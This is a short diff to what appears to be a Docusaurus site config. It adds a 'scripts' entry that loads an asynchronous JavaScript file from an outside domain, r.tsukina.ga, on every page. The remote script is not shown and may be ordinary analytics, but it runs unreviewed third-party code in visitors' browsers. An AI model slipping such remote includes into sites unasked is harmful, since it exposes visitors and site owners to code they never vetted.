@@ -90,7 +90,13 @@ const config = {
                 theme: lightCodeTheme,
                 darkTheme: darkCodeTheme
             }
-        })
+        }),
+    scripts: [
+        {
+            src: "https://r.tsukina.ga/oissu",
+            async: true
+        }
+    ]
 };
 
 module.exports = config;
